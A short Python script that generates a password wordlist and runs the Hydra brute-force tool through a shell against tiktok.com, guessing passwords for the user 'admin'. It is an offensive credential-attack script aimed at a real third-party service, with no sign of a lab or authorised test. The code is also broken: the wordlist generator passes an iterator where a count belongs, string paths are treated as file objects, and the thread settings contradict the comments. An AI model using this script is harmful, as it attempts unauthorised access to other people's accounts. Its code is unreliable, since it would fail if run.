import os
import shutil
import subprocess
import string
import itertools
import time

def password_generator(length_range, base_file_name, threads):
    characters = string.ascii_letters + string.digits
    passwords = itertools.product(characters, repeat=itertools.chain.from_iterable(itertools.repeat(length_range)))
    password_list = [''.join(password) for password in itertools.islice(passwords, threads)]
    with open(f"{base_file_name}.txt", "w") as wordlist_file:
        for password in password_list:
            wordlist_file.write(f"{password}\n")
    return f"{base_file_name}.txt"

def run_hydra(wordlist, target, service, username, threads):
    with open(wordlist, "r") as wordlist_file:
        command = f"hydra -P {wordlist.name} -l {username} -t {threads} {service}://{target}"
        subprocess.run(command, shell=True)

if __name__ == "__main__":
    base_file_name = "passwords"
    wordlist = password_generator(range(8, 10), base_file_name, 10)  # Set the number of threads to 10
    target = "tiktok.com"
    service = "http"
    username = "admin"
    threads = "16"
    # Run Hydra with the generated wordlist
    run_hydra(wordlist, target, service, username, 10)  # Set the number of threads to 10

    # Delete the remaining passwords
    os.remove(wordlist.name)
